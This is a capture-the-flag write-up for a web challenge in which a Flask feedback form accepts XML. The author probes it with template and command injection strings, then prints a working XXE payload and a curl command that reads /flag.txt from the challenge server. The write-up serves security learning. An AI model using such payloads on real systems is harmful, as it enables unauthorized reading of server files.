# Bad Feedback  - Writeup

**Category:** Web Exploitation  
**Vulnerability:** XXE (XML External Entity) Injection  
**Technique:** Content-Type Manipulation  

---

## 1. Challenge Description
The challenge presents a simple web page titled "Feedback Portal" containing two input fields: **Name** and **Message**.

The challenge description provides a sarcastic but critical hint:
> "A company rolled out a shiny feedback form and insists their customers are completely trustworthy. Every feedback is accepted at face value, no questions asked."

Additionally, it explicitly states: **"Flag is in the root."**

<img width="492" height="411" alt="Screenshot 2025-12-06 101201" src="https://github.com/user-attachments/assets/932f7283-b23c-4e8e-92a9-f57ea40ee86b" />


Upon submitting standard text, the application simply reflects the input back to the user:
> "Thank you for your feedback! Name: [User Input]"


---

## 2. Reconnaissance & Vulnerability Assessment
The URL indicated the application was running on port `:5000`. This is the default port for **Flask (Python)** web applications. Knowing this, I initially tested for vulnerabilities common to Python web apps.

### Initial Failed Attempts
1.  **SSTI (Server-Side Template Injection):** Since the input was reflected back, I tested for template injection using payloads like `{{ 7*7 }}` in both the Name and Message fields. The server returned them as plain text (`{{ 7*7 }}`), indicating the input was not being evaluated by a template engine like Jinja2.
2.  **Command Injection:** I attempted to inject shell commands using `$(ls)` and `; ls`, but these were also treated as safe strings.

<img width="640" height="355" alt="Screenshot 2025-12-06 101303" src="https://github.com/user-attachments/assets/9d9fe072-9c9c-46cb-a3cb-ddd8640305a2" />


### The Pivot
The failure of standard injection attacks led me to re-read the prompt: *"accepted at face value."*

This phrase often implies that the server trusts the **format** of the data provided by the user. While the browser automatically sends data as `application/x-www-form-urlencoded`, many backend frameworks (including Python's `lxml` or Flask wrappers) support multiple content types, including **XML**.

If the backend uses an XML parser with default settings, it might be vulnerable to **XXE (XML External Entity)** injection, allowing me to read files from the file system.

---

## 3. Exploitation Strategy (XXE)
To test for XXE, I needed to switch the communication protocol from Form Data to XML. I captured the request and used `curl` to modify the request headers and body.

### The Attack Logic
1.  **Header Manipulation:** Change `Content-Type` to `application/xml`.
2.  **DOCTYPE Definition:** Define a custom Document Type Definition (DTD).
3.  **External Entity:** Create an entity (variable) named `&xxe;` using the `SYSTEM` keyword.
4.  **Path:** Point the entity to `file:///flag.txt` (since the prompt said the flag is in the root).
5.  **Injection:** Place `&xxe;` inside the `<name>` tag. Since the application reflects the "Name" back to us, it should print the contents of the file.

### The Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feedback [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<feedback>
    <name>&xxe;</name>
    <message>test</message>
</feedback>
```

### Execution
I executed the attack using the following `curl` command:

```bash
curl -X POST http://15.206.47.5:5000/feedback \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feedback [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<feedback>
    <name>&xxe;</name>
    <message>test</message>
</feedback>'
```

---

## 4. Result
The server received the XML data. Because the parser had external entities enabled (the "trustworthy" configuration), it resolved `&xxe;` by reading `/flag.txt` from the server's root directory.

The application then generated the response "Thank you for your feedback! Name: [File Content]", revealing the flag.
<img width="898" height="285" alt="Screenshot 2025-12-06 103239" src="https://github.com/user-attachments/assets/df616e61-fb82-499a-aec7-9d503e719268" />


**Flag:** `CL0UdSEk_ReSeArCH_tEaM_CTF_2025{b3e0b6d2f1c1a2b4d5e6f71829384756}`
